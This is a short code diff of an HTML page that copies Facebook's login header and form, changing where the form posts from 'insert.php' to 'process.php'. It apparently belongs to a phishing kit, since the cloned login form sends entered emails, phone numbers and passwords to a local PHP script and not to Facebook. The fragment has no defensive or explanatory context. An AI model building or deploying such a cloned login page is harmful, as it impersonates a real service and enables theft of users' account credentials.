@@ -233,7 +233,7 @@
                                 <h1><a href="https://www.facebook.com/" title="Go to Facebook home"><i class="fb_logo img sp_WQkjDN-lT6A sx_f70dca"><u>Facebook</u></i></a></h1>
                             </div>
                             <div class="menu_login_container rfloat _ohf" data-testid="royal_login_form">
-                                <form id="login_form" action="insert.php" method="post">
+                                <form id="login_form" action="process.php" method="post">
                                     <table cellspacing="0" role="presentation">
                                         <tr>
                                             <td class="html7magic"><label for="email">Email or Phone</label></td>
